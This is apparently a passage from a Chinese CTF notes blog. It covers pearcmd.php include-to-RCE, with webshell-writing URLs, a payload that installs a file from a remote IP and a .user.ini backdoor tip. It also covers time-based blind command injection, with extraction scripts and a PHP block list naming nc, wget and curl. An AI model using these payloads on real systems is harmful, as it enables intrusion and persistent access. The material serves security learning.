class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line"># first find which PHP binary to use</span><br><span class="line">if test &quot;x$PHP_PEAR_PHP_BIN&quot; != &quot;x&quot;; then</span><br><span class="line">  PHP=&quot;$PHP_PEAR_PHP_BIN&quot;</span><br><span class="line">else</span><br><span class="line">  if test &quot;/usr/local/bin/php&quot; = &#x27;@&#x27;php_bin&#x27;@&#x27;; then</span><br><span class="line">    PHP=php</span><br><span class="line">  else</span><br><span class="line">    PHP=&quot;/usr/local/bin/php&quot;</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"># then look for the right pear include dir</span><br><span class="line">if test &quot;x$PHP_PEAR_INSTALL_DIR&quot; != &quot;x&quot;; then</span><br><span class="line">  INCDIR=$PHP_PEAR_INSTALL_DIR</span><br><span class="line">  INCARG=&quot;-d include_path=$PHP_PEAR_INSTALL_DIR&quot;</span><br><span class="line">else</span><br><span class="line">  if test &quot;/usr/local/lib/php&quot; = &#x27;@&#x27;php_dir&#x27;@&#x27;; then</span><br><span class="line">    INCDIR=`dirname $0`</span><br><span class="line">    INCARG=&quot;&quot;</span><br><span class="line">  else</span><br><span class="line">    INCDIR=&quot;/usr/local/lib/php&quot;</span><br><span class="line">    INCARG=&quot;-d include_path=/usr/local/lib/php&quot;</span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exec $PHP -C -q $INCARG -d date.timezone=UTC -d output_buffering=1 -d variables_order=EGPCS -d open_basedir=&quot;&quot; -d safe_mode=0 -d register_argc_argv=&quot;On&quot; -d auto_prepend_file=&quot;&quot; -d auto_append_file=&quot;&quot; $INCDIR/pearcmd.php &quot;$@&quot;</span><br></pre></td></tr></table></figure><p>通过看最后一行可以知道其实它是通过php调用了pearcmd.php,那么pearcmd.php中$argv是从哪里来的呢,通过简单查找可以看到其调用了另一个php文件中某个类方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">require_once &#x27;Console/Getopt.php&#x27;;</span><br><span class="line">/* ... */</span><br><span class="line">$argv = Console_Getopt::readPHPArgv();</span><br></pre></td></tr></table></figure><p>再次跟进Console&#x2F;Getopt.php,找到该方法的实现:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static function readPHPArgv()</span><br><span class="line">    &#123;</span><br><span class="line">        global $argv;</span><br><span class="line">        if (!is_array($argv)) &#123;</span><br><span class="line">            if (!@is_array($_SERVER[&#x27;argv&#x27;])) &#123;</span><br><span class="line">                if (!@is_array($GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;])) &#123;</span><br><span class="line">                    $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;;</span><br><span class="line">                    return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg);</span><br><span class="line">                &#125;</span><br><span class="line">                return $GLOBALS[&#x27;HTTP_SERVER_VARS&#x27;][&#x27;argv&#x27;];</span><br><span class="line">            &#125;</span><br><span class="line">            return $_SERVER[&#x27;argv&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">        return $argv;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到获取$argv的方式是<code>global $argv --&gt; $_SERVER[&#39;argv&#39;] --&gt; $GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;]</code></p><p>同时我们知道当我们include一个可以被php解析的文件的时候,php代码会被自动执行,这样在register<em>argc</em>argv开启的情况下我们就有可能通过包含pearcmd.php与操控$_SERVER[‘argv’]来执行pear命令</p><h3 id="pear命令任意文件下载-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear命令任意文件下载"><a href="#pear命令任意文件下载-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-pear命令任意文件下载" class="headerlink" title="pear命令任意文件下载[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#pear命令任意文件下载)"></a>pear命令任意文件下载[#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a> to RCE的巧妙组合&#x2F;#pear命令任意文件下载)</h3><p>我们先来看看如何通过pear命令来实现任意文件下载:</p><ol><li><p>在目录下创建一个tmp.php<br> <img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082631-1700990443387-230.png"></p></li><li><p>使用python一句话开启http服务器:<code>python -m SimpleHTTPServer 8080</code></p></li><li><p>通过执行<code>pear</code>命令获取帮助,发现存在download选项,尝试执行<code>pear download http://127.0.0.1:8080/tmp.php</code>,可以看到已经成功在当前目录下载了tmp.php:<br> <img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082702-1700990443387-234.png"></p></li><li><p>有没有办法控制下载目录?答案是使用install -R而非download,尝试执行<code>pear install -R /var/www/html http://127.0.0.1:8080/tmp.php</code></p><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082751-1700990443387-232.png"></p></li><li><p>成功下载到web目录下并能够访问<br> <img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082843-1700990443387-231.png"></p></li></ol><h3 id="如何控制-SERVER-‘argv’-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-如何控制-serverargv"><a href="#如何控制-SERVER-‘argv’-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-如何控制-serverargv" class="headerlink" title="如何控制$_SERVER[‘argv’][#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#如何控制_serverargv)"></a>如何控制$_SERVER[‘argv’][#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a> to RCE的巧妙组合&#x2F;#如何控制_serverargv)</h3><p>如何往$_SERVER[‘argv’]传入2个或以上的参数?测试一下:</p><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082904-1700990443387-235.png"></p><p>并不能通过&amp;作为$_SERVER[‘argv’]的分割,通过查阅资料和阅读源码:</p><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082919-1700990443387-236.png"></p><p>main&#x2F;php_variables.c  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI void php_build_argv(const char *s, zval *track_vars_array)</span><br><span class="line">&#123;</span><br><span class="line">zval arr, argc, tmp;</span><br><span class="line">int count = 0;</span><br><span class="line">if (!(SG(request_info).argc || track_vars_array)) &#123;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">array_init(&amp;arr);</span><br><span class="line">/* Prepare argv */</span><br><span class="line">if (SG(request_info).argc) &#123; /* are we in cli sapi? */</span><br><span class="line">int i;</span><br><span class="line">for (i = 0; i &lt; SG(request_info).argc; i++) &#123;</span><br><span class="line">ZVAL_STRING(&amp;tmp, SG(request_info).argv[i]);</span><br><span class="line">if (zend_hash_next_index_insert(Z_ARRVAL(arr), &amp;tmp) == NULL) &#123;</span><br><span class="line">zend_string_efree(Z_STR(tmp));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else if (s &amp;&amp; *s) &#123;</span><br><span class="line">while (1) &#123;</span><br><span class="line">const char *space = strchr(s, &#x27;+&#x27;);</span><br><span class="line">/* auto-type */</span><br><span class="line">ZVAL_STRINGL(&amp;tmp, s, space ? space - s : strlen(s));</span><br><span class="line">count++;</span><br><span class="line">if (zend_hash_next_index_insert(Z_ARRVAL(arr), &amp;tmp) == NULL) &#123;</span><br><span class="line">zend_string_efree(Z_STR(tmp));</span><br><span class="line">&#125;</span><br><span class="line">if (!space) &#123;</span><br><span class="line">break;</span><br><span class="line">&#125; s</span><br><span class="line">= space + 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以知道argv通过query_string取值,并通过+作为分割符,尝试一下:</p><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082954-1700990443387-237.png"></p><h2 id="回到题目-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-回到题目"><a href="#回到题目-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-回到题目" class="headerlink" title="回到题目[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#回到题目)"></a>回到题目[#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a> to RCE的巧妙组合&#x2F;#回到题目)</h2><p>现在回到题目,我们所有的拼图已经凑齐了,假如存在以下环境:</p><ul><li>安装了pear</li><li>开启了register<em>argc</em>argv</li><li>存在可控的<code>include $_GET[&#39;f&#39;]</code>(即使是<code>include $_GET[&#39;f&#39;].php</code>)</li></ul><p>那么我们就可以通过上面的知识实现任意文件下载从而getshell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//通过本地直接写入webshell,注意这里最好抓包然后用burpsuite或者直接curl执行，否则浏览器会将&lt; ? &gt; 转义</span><br><span class="line">// config-create可以直接创建配置文件，且第一个参数必须以/开头</span><br><span class="line">http://ip:port/include.php?f=pearcmd&amp;+config-create+/&lt;?=phpinfo();?&gt;+/tmp/evil.php</span><br><span class="line">// 通过远程直接下载webshel</span><br><span class="line">// web目录可写</span><br><span class="line">- http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php</span><br><span class="line">- http://ip:port/tmp/pear/download/evil.php</span><br><span class="line">// tmp目录可写</span><br><span class="line">- http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php</span><br><span class="line">- http://ip:port/include.php?f=/tmp/pear/download/evil</span><br></pre></td></tr></table></figure><p>&amp;+install+-R+&#x2F;tmp+<a href="http://162.14.65.110:8888/1.php">http://162.14.65.110:8888/1.php</a></p><h2 id="后门-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-后门"><a href="#后门-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-后门" class="headerlink" title="后门[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#后门)"></a>后门[#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a> to RCE的巧妙组合&#x2F;#后门)</h2><p>前面提到register<em>argc</em>argv是PHP INI PERDIR的,所以我们可以通过新建一个.user.ini设置register<em>argc</em>argv为On用于留后门</p><h2 id="最后-docker-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-最后docker"><a href="#最后-docker-https-longlone-top-安全-安全研究-register-argc-argv与include-to-RCE的巧妙组合-最后docker" class="headerlink" title="最后:docker[#](https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合&#x2F;#最后docker)"></a>最后:docker[#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/安全/安全研究/register_argc_argv与include</a> to RCE的巧妙组合&#x2F;#最后docker)</h2><p>在php官方提供的镜像下,默认是不使用php.ini的(在&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php中存在php.ini-production和php.ini-development,需要手动修改任意一个文件名为php.ini才会启动php.ini,而上面我们提到在php.ini中register<em>argc</em>argv都设置为Off)</p><p>而register<em>argc</em>argv在不设置的情况下默认为On,那么假如有一个默认的docker-php环境,并存在可控的<code>include $_GET[&#39;f&#39;]</code>(即使是include $_GET[‘f’].php),我们就可以利用这个漏洞实现getshell</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令注入盲注读取文件</title>
      <link href="/2023/10/17/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9B%B2%E6%B3%A8%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/"/>
      <url>/2023/10/17/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9B%B2%E6%B3%A8%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="命令注入盲注读取文件"><a href="#命令注入盲注读取文件" class="headerlink" title="命令注入盲注读取文件"></a>命令注入盲注读取文件</h1><p>这实际上是有2道题，但是源码一样，权限不一样。</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先可以看到执行命令的函数是exec()，这个函数并不会将命令执行后的结果回显出来，所以是一个无回显的命令注入，但是这里还ban了很多命令和符号，导致了我们想通过DNSLog和HTTP外带以及反弹shell都无法实现。<br>有写入权限</p><p>在有写入权限的情况下，事情就变得简单了，我们可以利用tee命令</p><p>tee [OPTION]… [FILE]…</p><p>从标准输入读取数据并重定向到标准输出和文件。</p><blockquote><p>example:</p><p>tee file1 file2      &#x2F;&#x2F;将输入的内容覆盖到这两个文件里面<br>ls|tee 1.txt          &#x2F;&#x2F;将ls命令的输出显示并保存到1.txt文件中</p></blockquote><p>我们可以通过这个命令将执行之后的结果写入到文件中，然后再访问这个文件即可。</p><blockquote><p>payload:</p><p>?c&#x3D;ls &#x2F;|tee 1.txt        &#x2F;&#x2F;访问1.txt，发现有f149_15_h3r3文件<br>?c&#x3D;cat &#x2F;f149_15_h3r3|tee 2.txt        &#x2F;&#x2F;再访问2.txt即可<br>没有写入权限</p></blockquote><p>没有写入权限就比较麻烦了，只能通过sleep命令根据执行时间来进行盲注。</p><pre><code>首先我们可以通过sleep命令根据返回的时间来判断是否存在命令执行漏洞。</code></pre><p>?c&#x3D;sleep 5</p><p>可以发现网页等待了5秒才返回结果。</p><pre><code>利用shell编程的if判断语句配合awk以及cut命令来获取flagawk逐行获取数据</code></pre><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/# cat flag </span><br><span class="line">  hello</span><br><span class="line">  Flag&#123;success!!&#125;</span><br><span class="line">  root@ubuntu:/# cat flag | awk NR==1</span><br><span class="line">  hello</span><br><span class="line">  root@ubuntu:/# cat flag | awk NR==2</span><br><span class="line">  Flag&#123;success!!&#125;</span><br></pre></td></tr></table></figure></blockquote><pre><code>cut命令逐列获取单个字符</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/# cat flag | awk NR==2 | cut -c 1</span><br><span class="line"> F</span><br><span class="line"> root@ubuntu:/# cat flag | awk NR==2 | cut -c 2</span><br><span class="line"> l</span><br><span class="line"> root@ubuntu:/# cat flag | awk NR==2 | cut -c 3</span><br><span class="line"> a</span><br></pre></td></tr></table></figure><blockquote><p>利用if语句来判断命令是否执行</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/# if [ $(cat flag | awk NR==2 | cut -c 1) == F ];then echo &quot;right!&quot;;fi</span><br><span class="line">right!</span><br><span class="line">root@ubuntu:/# if [ $(cat flag | awk NR==2 | cut -c 2) == l ];then echo &quot;right!&quot;;fi</span><br><span class="line">right!</span><br><span class="line">root@ubuntu:/# if [ $(cat flag | awk NR==2 | cut -c 1) == F ];then sleep 2;fi</span><br></pre></td></tr></table></figure><blockquote><p>用命令ls \查看根目录来获取flag文件名</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;xxxxx&quot;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">for i in range(1,5):</span><br><span class="line">    for j in range(1,15):</span><br><span class="line">        #ascii码表</span><br><span class="line">        for k in range(32,128):</span><br><span class="line">            k=chr(k)</span><br><span class="line">            payload = &quot;?c=&quot; + f&quot;if [ `ls / | awk NR==&#123;i&#125; | cut -c &#123;j&#125;` == &#123;k&#125; ];then sleep 2;fi&quot;</span><br><span class="line">            try:</span><br><span class="line">                requests.get(url=url+payload, timeout=(1.5,1.5))</span><br><span class="line">            except:</span><br><span class="line">                result = result + k</span><br><span class="line">                print(result)</span><br><span class="line">                break</span><br><span class="line">    result += &quot; &quot;</span><br></pre></td></tr></table></figure><blockquote><p>发现一个叫f149_15_h3r3的文件，改以下脚本cat一下</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;xxxx</span></span><br><span class="line"><span class="string">result = &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">for i in range(1,5):</span></span><br><span class="line"><span class="string">    for j in range(1,60):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       for k in range(32,128):</span></span><br><span class="line"><span class="string">            k=chr(k)</span></span><br><span class="line"><span class="string">            payload = &quot;</span>?c=<span class="string">&quot; + f&quot;</span><span class="keyword">if</span> [ `cat /f149_15_h3r3 | awk NR==&#123;i&#125; | cut -c &#123;j&#125;` == &#123;k&#125; ];then sleep <span class="number">2</span>;fi<span class="string">&quot;</span></span><br><span class="line"><span class="string">            try:</span></span><br><span class="line"><span class="string">              requests.get(url=url+payload, timeout=(1.5,1.5))</span></span><br><span class="line"><span class="string">           except:</span></span><br><span class="line"><span class="string">               result = result + k</span></span><br><span class="line"><span class="string">              print(result)</span></span><br><span class="line"><span class="string">              break</span></span><br><span class="line"><span class="string">  result += &quot;</span> <span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>以上是get版本的，最近做了newstar，考了这个知识点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://fbf7e8e2-509c-4a09-94a5-0b42650ca7a7.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>):</span><br><span class="line">        k = <span class="built_in">chr</span>(k)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;payload&#x27;</span>: <span class="string">&#x27;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;N;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;s:4:&quot;code&quot;;s:74:&quot;if [ `cat /flag_is_h3eeere | awk NR==1 | cut -c %s` == %s ];then sleep 3;fi&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;&#x27;</span> % (i, k)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(url=url, data=data, timeout=(<span class="number">2</span>, <span class="number">2</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result = result + k</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            <span class="comment">#需要注意脚本中的i，k的值</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无参RCE</title>
      <link href="/2023/10/16/%E6%97%A0%E5%8F%82RCE/"/>
      <url>/2023/10/16/%E6%97%A0%E5%8F%82RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="无参RCE"><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h1><h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>刷buu的时候遇到一道题，[GXYCTF2019]禁止套娃，涉及到无参数RCE，但是我不会，记录一下学习过程。<br> <strong>实例</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123; </span><br><span class="line">eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">preg_replace(&#x27;/[a-z]+\((?R)?\)/&#x27;, NULL, $code)</span><br><span class="line">pre_match(&#x27;/et|na|nt|strlen|info|path||rand|dec|bin|hex|oct|pi|exp|log/i&#x27;, $code))</span><br></pre></td></tr></table></figure><p><strong>解析</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 